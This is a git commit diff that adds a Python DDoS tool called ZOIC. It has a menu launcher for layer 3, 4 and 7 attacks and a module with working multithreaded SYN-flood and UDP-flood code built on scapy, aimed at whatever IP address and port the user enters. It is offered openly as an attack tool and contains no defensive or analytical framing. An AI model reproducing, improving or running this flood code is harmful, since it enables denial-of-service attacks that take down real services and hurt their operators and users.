77469e0354820311fcb5e33ef18a0cb497666067
건우Sec <madanokr002@gmail.com>
2024-11-06 16:53:04 +0900

    ZOIC DDOS TOOLS
    remake !

---
+++ ZOIC/main.py
@@ -0,0 +1,96 @@
+import os
+import sys
+from module.l3 import *
+from module.l4 import *
+from module.l7 import *
+from Tools.Lockup import *
+from Tools.nmap import *
+from update.main import *
+
+
+class TextColors:
+    BLACK = '\033[30m'
+    RED = '\033[31m'
+    GREEN = '\033[32m'
+    YELLOW = '\033[33m'
+    BLUE = '\033[34m'
+    MAGENTA = '\033[35m'
+    CYAN = '\033[36m'
+    WHITE = '\033[37m'
+    PURPLE = '\033[35m'
+    UNDERLINE = '\033[4m'
+    RESET = '\033[0m'
+    BOLD = "\033[01;01m"
+    DARK_RED = "\033[38;5;124m"
+    CRIMSON = "\033[38;5;196m"
+    TOMATO = "\033[38;5;202m"
+    LIGHT_RED = "\033[91m"
+    LIGHT_GREEN = "\033[92m" 
+    LIGHT_YELLOW = "\033[93m"
+    LIGHT_BLUE = "\033[94m"
+    LIGHT_MAGENTA = "\033[95m"
+    LIGHT_CYAN = "\033[96m"
+    LIGHT_WHITE = "\033[97m"
+    DARK_GOLD = "\033[38;5;220m" 
+    RICH_BLUE = "\033[38;5;32m"  
+    TANGERINE = "\033[38;5;214m"
+    SNOW = "\033[38;5;231m"      
+    ELECTRIC_LIME = "\033[38;5;48m"
+    STORMY_BLUE = "\033[38;5;24m" 
+    RADICAL_RED = "\033[38;5;160m"
+
+def logo():
+    os.system('cls' if os.name == 'nt' else 'clear')
+    print(TextColors.RADICAL_RED + """
+
+███████╗ ██████╗ ██╗ ██████╗
+╚══███╔╝██╔═══██╗██║██╔════╝
+  ███╔╝ ██║   ██║██║██║       Revolt : https://rvlt.gg/PeewQeV9  
+ ███╔╝  ██║   ██║██║██║     
+███████╗╚██████╔╝██║╚██████╗  Github : https://github.com/madanokr001
+╚══════╝ ╚═════╝ ╚═╝ ╚═════╝
+╔════════════════════════════════════════════════════════════════════╗
+║      INFO MENU       ║   DDOS ATTACK MENU  ║      TOOLS MENU       ║ 
+║════════════════════════════════════════════════════════════════════║
+║                      ║                     ║                       ║                       
+║     [01] Update      ║    [03] LAYER 3     ║     [06] NMAP         ║
+║     [02] EXIT        ║    [04] LAYER 4     ║     [07] DNSLOCKUP    ║
+║                      ║    [05] LAYER 7     ║                       ║
+║                      ║                     ║                       ║
+║                      ║                     ║                       ║                                                                     
+╚════════════════════════════════════════════════════════════════════╝
+         
+""")
+
+def main():
+    while True:
+        logo()
+        select = input(TextColors.DARK_RED + """═══[root@ZOIC~$]                                                                   
+═══> """ + TextColors.RESET)
+                                         
+        if select == "1" or select.lower() == "1":
+            upadate_main()
+    
+        elif select == "3" or select.lower() == "3":
+            layer3()
+
+        elif select == "4" or select.lower() == "4":
+            layer4()
+
+        elif select == "5" or select.lower() == "5":
+            layer7()
+
+        elif select == "7" or select.lower() == "5":
+            dnslockup()
+
+        elif select == "6" or select.lower() == "7":
+            nmap_main()
+            
+        elif select == "2" or select.lower() == "2":
+            sys.exit()
+    
+             
+
+
+if __name__ == "__main__":
+    main()
---
+++ ZOIC/module/l4.py
@@ -0,0 +1,114 @@
+import os
+import sys
+import random
+import threading
+import time
+from scapy.all import IP, TCP, UDP, Raw, send
+
+class TextColors:
+    BLACK = '\033[30m'
+    RED = '\033[31m'
+    GREEN = '\033[32m'
+    YELLOW = '\033[33m'
+    BLUE = '\033[34m'
+    MAGENTA = '\033[35m'
+    CYAN = '\033[36m'
+    WHITE = '\033[37m'
+    PURPLE = '\033[35m'
+    UNDERLINE = '\033[4m'
+    RESET = '\033[0m'
+    BOLD = "\033[01;01m"
+    DARK_RED = "\033[38;5;124m"
+    CRIMSON = "\033[38;5;196m"
+    TOMATO = "\033[38;5;202m"
+    LIGHT_RED = "\033[91m"
+    LIGHT_GREEN = "\033[92m" 
+    RADICAL_RED = "\033[38;5;160m"
+
+def logo():
+    os.system('cls' if os.name == 'nt' else 'clear')
+    print(TextColors.RADICAL_RED + """
+        ██╗      █████╗ ██╗   ██╗███████╗██████╗     ██╗  ██╗
+        ██║     ██╔══██╗╚██╗ ██╔╝██╔════╝██╔══██╗    ██║  ██║
+        ██║     ███████║ ╚████╔╝ █████╗  ██████╔╝    ███████║
+        ██║     ██╔══██║  ╚██╔╝  ██╔══╝  ██╔══██╗    ╚════██║
+        ███████╗██║  ██║   ██║   ███████╗██║  ██║         ██║
+        ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝         ╚═╝ 
+          
+╔════════════════════════════════════════════════════════════════════╗
+║                   https://doxwebd.serveo.net                       ║
+║════════════════════════════════════════════════════════════════════║
+║                                                                    ║
+║                        [1] SYN FLOOD                               ║
+║                        [2] UDP FLOOD                               ║
+║                        [3] EXIT                                    ║
+║                                                                    ║                                                                  
+╚════════════════════════════════════════════════════════════════════╝
+""")
+
+def layer4():
+    while True:
+        logo()
+        select = input(TextColors.DARK_RED + """═══[root@ZOIC~$]                                                                   
+═══> """ + TextColors.RESET)
+
+        if select == "1" or select.lower() == "1":
+            def send_packets(target_ip, target_port):
+                while True:
+                    ip = IP(dst=target_ip)
+                    tcp = TCP(sport=random.randint(1024, 65535), dport=target_port, flags="S", options=[("MSS", 1460)])
+                    byte = Raw(load='X' * 1400)
+                    pkt = ip / tcp / byte
+                    send(pkt, verbose=0)
+                    print(TextColors.LIGHT_GREEN + f"[+] IP Address : {target_ip} [+] SYN Packet : {pkt.summary()}"+ TextColors.RESET)
+                    time.sleep(0.01)
+
+            def start_flooding(target_ip, target_port, thread_count):
+                threads = []
+                for _ in range(thread_count):
+                    thread = threading.Thread(target=send_packets, args=(target_ip, target_port))
+                    threads.append(thread)
+                    thread.start()
+                for thread in threads:
+                    thread.join()
+
+            target_ip = input(TextColors.LIGHT_RED + "IP > "+ TextColors.RESET)  
+            target_port = int(input(TextColors.LIGHT_RED + "Port > "+ TextColors.RESET))  
+            thread_count = int(input(TextColors.LIGHT_RED + "Thread > "+ TextColors.RESET))  
+            start_flooding(target_ip, target_port, thread_count)
+
+
+        elif select == "2" or select.lower() == "2":
+            def udp_flood(target_ip, target_port):
+                while True:
+                    ip = IP(dst=target_ip)
+                    udp = UDP(sport=random.randint(1024, 65535), dport=target_port)
+                    byte = Raw(load='X' * 1400)
+                    pkt = ip / udp / byte
+                    send(pkt, verbose=0)
+                    print(TextColors.LIGHT_GREEN + f"[+] IP Address : {target_ip} [+] UDP Packet : {pkt.summary()}" + TextColors.RESET)
+
+            def start_flooding(target_ip, target_port, thread_count):
+                threads = []
+                for _ in range(thread_count):
+                    thread = threading.Thread(target=udp_flood, args=(target_ip, target_port))
+                    threads.append(thread)
+                    thread.start()
+                for thread in threads:
+                    thread.join()
+
+            target_ip = input(TextColors.LIGHT_RED + "IP > "+ TextColors.RESET)  
+            target_port = int(input(TextColors.LIGHT_RED + "Port > "+ TextColors.RESET))  
+            thread_count = int(input(TextColors.LIGHT_RED + "Thread > "+ TextColors.RESET))  
+
+            start_flooding(target_ip, target_port, thread_count)
+            
+
+        elif select == "3" or select.lower() == "2":
+            sys.exit()
+    
+             
+
+
+if __name__ == "__main__":
+    layer4()
